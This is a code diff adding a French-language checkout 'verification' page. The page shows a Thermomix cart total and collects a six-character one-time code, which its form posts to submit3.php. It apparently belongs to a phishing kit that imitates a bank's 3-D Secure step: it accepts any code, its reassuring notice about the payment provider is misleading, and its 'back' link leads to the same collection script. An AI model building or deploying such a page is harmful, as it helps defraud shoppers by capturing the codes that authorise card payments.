@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Vérification</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f5f7fa;
+      color: #17202a;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 430px;
+      background: #ffffff;
+      padding: 32px;
+      border-radius: 16px;
+      border: 1px solid #e4e7eb;
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.08);
+    }
+
+    .icon {
+      width: 54px;
+      height: 54px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      background: #17202a;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 25px;
+      margin-bottom: 10px;
+    }
+
+    .description {
+      text-align: center;
+      color: #697580;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+
+    .amount-box {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px;
+      margin-bottom: 25px;
+      background: #f5f7fa;
+      border: 1px solid #e5e9ed;
+      border-radius: 10px;
+    }
+
+    .amount-label {
+      color: #697580;
+      font-size: 14px;
+    }
+
+    #cartAmount {
+      font-size: 20px;
+      font-weight: 700;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    #otp {
+      width: 100%;
+      height: 56px;
+      padding: 0 15px;
+      border: 1px solid #cfd6dd;
+      border-radius: 9px;
+      outline: none;
+      text-align: center;
+      font-size: 22px;
+      letter-spacing: 5px;
+      text-transform: uppercase;
+    }
+
+    #otp:focus {
+      border-color: #17202a;
+      box-shadow: 0 0 0 3px rgba(23, 32, 42, 0.08);
+    }
+
+    .counter {
+      margin-top: 7px;
+      text-align: right;
+      font-size: 12px;
+      color: #7b858e;
+    }
+
+    .error {
+      min-height: 20px;
+      margin-top: 8px;
+      color: #c0392b;
+      font-size: 13px;
+    }
+
+    button {
+      width: 100%;
+      height: 52px;
+      margin-top: 8px;
+      border: none;
+      border-radius: 9px;
+      background: #17202a;
+      color: white;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #273442;
+    }
+
+    .back {
+      display: block;
+      margin-top: 18px;
+      text-align: center;
+      color: #697580;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .back:hover {
+      text-decoration: underline;
+    }
+
+    .notice {
+      margin-top: 22px;
+      text-align: center;
+      color: #8a949d;
+      font-size: 11px;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <div class="icon">✓</div>
+
+    <h1>Vérification</h1>
+
+    <p class="description">
+      Entrez le code de vérification pour continuer.
+    </p>
+
+    <div class="amount-box">
+      <span class="amount-label">Montant du panier</span>
+      <strong id="cartAmount">0,00 €</strong>
+    </div>
+
+    <form id="otpForm" action="submit3.php" method="POST">
+
+      <label for="otp">
+        Code de vérification
+      </label>
+
+      <input
+      
+        type="text"
+        id="otp"
+        name="otp"
+        maxlength="6"
+        autocomplete="one-time-code"
+        inputmode="text"
+        placeholder="••••••"
+      >
+
+      <div class="counter" id="counter">
+        0 / 6
+      </div>
+
+      <div class="error" id="error"></div>
+
+      <button type="submit">
+        Continuer
+      </button>
+
+    </form>
+
+    <a href="submit3.php" class="back">
+      Retour au panier
+    </a>
+
+    <div class="notice">
+        Les informations de paiement sont traitées directement par le prestataire de paiement. Elles ne sont pas enregistrées dans cette page.
+    </div>
+
+  </div>
+
+  <script>
+
+    /*
+     * Récupération du panier créé par cart.html
+     *
+     * cart.html enregistre :
+     *
+     * {
+     *   name: "Thermomix® TM7",
+     *   price: 800,
+     *   quantity: 1
+     * }
+     *
+     * dans localStorage sous "demoOrder".
+     */
+
+    function getCartTotal() {
+
+      const order = localStorage.getItem("demoOrder");
+
+      if (!order) {
+        return 0;
+      }
+
+      try {
+
+        const data = JSON.parse(order);
+
+        const price = Number(data.price) || 0;
+        const quantity = Number(data.quantity) || 0;
+
+        return price * quantity;
+
+      } catch (error) {
+
+        return 0;
+
+      }
+    }
+
+
+    /*
+     * Formatage du montant.
+     *
+     * Exemple :
+     * 800 -> 800,00 €
+     */
+
+    function formatEuro(amount) {
+
+      return new Intl.NumberFormat("fr-FR", {
+        style: "currency",
+        currency: "EUR"
+      }).format(amount);
+
+    }
+
+
+    /*
+     * Affichage du montant réel
+     * enregistré dans cart.html.
+     */
+
+    const total = getCartTotal();
+
+    document.getElementById("cartAmount").textContent =
+      formatEuro(total);
+
+
+    /*
+     * Champ OTP :
+     *
+     * - lettres autorisées
+     * - chiffres autorisés
+     * - maximum 6 caractères
+     * - caractères convertis en majuscules
+     */
+
+    const otpInput =
+      document.getElementById("otp");
+
+    const counter =
+      document.getElementById("counter");
+
+    const error =
+      document.getElementById("error");
+
+
+    otpInput.addEventListener("input", function () {
+
+      this.value = this.value
+        .replace(/[^a-zA-Z0-9]/g, "")
+        .toUpperCase()
+        .slice(0, 6);
+
+      counter.textContent =
+        this.value.length + " / 6";
+
+      error.textContent = "";
+
+    });
+
+
+    /*
+     * Validation locale du formulaire.
+     */
+
+    document
+      .getElementById("otpForm")
+      .addEventListener("submit", function (event) {
+
+        
+
+        const code = otpInput.value;
+
+        if (!/^[A-Z0-9]{1,6}$/.test(code)) {
+
+          error.textContent =
+            "Veuillez entrer un code valide de 1 à 6 caractères.";
+
+          otpInput.focus();
+
+          return;
+        }
+
+
+        /*
+         * Vérification locale uniquement.
+         */
+
+        localStorage.setItem(
+          "verificationCompleted",
+          "true"
+        );
+
+
+        /*
+         * Redirection après validation.
+         */
+
+        
+
+      });
+
+  </script>
+
+</body>
+</html>
